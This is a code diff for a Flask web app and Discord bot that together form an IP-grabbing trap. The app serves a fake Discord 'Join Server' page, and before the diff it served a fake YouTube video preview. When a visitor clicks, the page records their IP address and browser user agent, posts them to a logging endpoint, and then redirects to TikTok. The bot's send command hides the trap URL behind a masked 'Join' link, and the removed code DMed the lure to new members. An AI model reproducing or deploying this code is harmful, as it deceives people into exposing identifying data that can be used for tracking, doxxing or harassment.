@@ -15,50 +15,55 @@ socket.getaddrinfo = getaddrinfo_ipv4
 
 app = Flask(__name__)
 
-# --- CONFIGURATION (PULLED FROM RAILWAY VARIABLES) ---
+# --- CONFIGURATION ---
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
-REAL_DISCORD_INVITE = "https://discord.gg/3rUY7UD5z" 
-# -----------------------------------------------------
+# ---------------------
 
-FAKE_PLAYER_HTML = """
+FAKE_JOIN_HTML = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube</title>
-    <meta property="og:type" content="video.other">
-    <meta property="og:site_name" content="YouTube">
-    <meta property="og:title" content="EP 2: Crafting The RAREST Spinny Bros in Steal a Brainrot..">
-    <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
-    <meta property="og:video" content="https://rnbw-production.up.railway.app/video.mp4">
-    <meta property="og:video:secure_url" content="https://rnbw-production.up.railway.app/video.mp4">
-    <meta property="og:video:type" content="video/mp4">
+    <title>Discord</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #0f0f0f; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .loader { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { margin: 0; padding: 0; background-color: #313338; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background-color: #2b2d31; border-radius: 8px; width: 90%; max-width: 400px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.5); text-align: center; padding-bottom: 20px; }
+        .banner { height: 120px; background: #1e1f22; }
+        .icon { width: 80px; height: 80px; border-radius: 50%; border: 6px solid #2b2d31; background-color: #000; margin: -40px auto 10px auto; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 24px; }
+        .title { font-size: 20px; font-weight: bold; margin-bottom: 8px; }
+        .status { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
+        .dot { height: 10px; width: 10px; background-color: #23a55a; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .btn { background-color: #23a55a; color: #fff; border: none; padding: 12px 24px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 80%; font-weight: bold; transition: 0.2s; }
+        .btn:hover { background-color: #1e8e4e; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
+    <div class="card">
+        <div class="banner"></div>
+        <div class="icon">C😭s</div>
+        <div class="title">CloudyPookie😭's server</div>
+        <div class="status"><span class="dot"></span> 4 Online &nbsp; • &nbsp; 5 Members</div>
+        <button class="btn" onclick="startTrap()">Join Server</button>
+    </div>
+
     <script>
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => {
-                fetch('/log', {
+        async function startTrap() {
+            document.querySelector('.btn').innerText = "Joining...";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                await fetch('/log', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
-                }).then(() => {
-                    window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
+                    body: JSON.stringify({ip: data.ip, ua: navigator.userAgent})
                 });
-            })
-            .catch(() => {
-                window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
-            });
+            } catch (e) {}
+            // Redirect to TikTok after grab
+            window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
+        }
     </script>
 </body>
 </html>
@@ -66,15 +71,7 @@ FAKE_PLAYER_HTML = """
 
 @app.route('/')
 def index():
-    return render_template_string(FAKE_PLAYER_HTML)
-
-@app.route('/video.mp4')
-def fake_video():
-    return app.response_class(
-        response=b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom',
-        status=200,
-        mimetype='video/mp4'
-    )
+    return render_template_string(FAKE_JOIN_HTML)
 
 @app.route('/log', methods=['POST'])
 def log():
@@ -106,7 +103,6 @@ def log():
 # --- DISCORD BOT ---
 intents = discord.Intents.default()
 intents.message_content = True
-intents.members = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 @bot.event
@@ -115,21 +111,9 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    await ctx.send(f"Join up: {REAL_DISCORD_INVITE}")
-
-@bot.event
-async def on_member_join(member):
-    try:
-        embed = discord.Embed(
-            title="Video Leak 🎥",
-            description="Click to watch the new video.",
-            color=0x2b2d31
-        )
-        embed.url = RAILWAY_URL
-        embed.set_image(url="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg")
-        await member.send(embed=embed)
-    except Exception as e:
-        print(f"Could not DM {member.name}: {e}")
+    # This masks the link. They see "Join", but it goes to your Railway trap.
+    trap_link = f"[Join]({RAILWAY_URL})"
+    await ctx.send(f"Come hang out: {trap_link}")
 
 def run_bot():
     if not BOT_TOKEN:
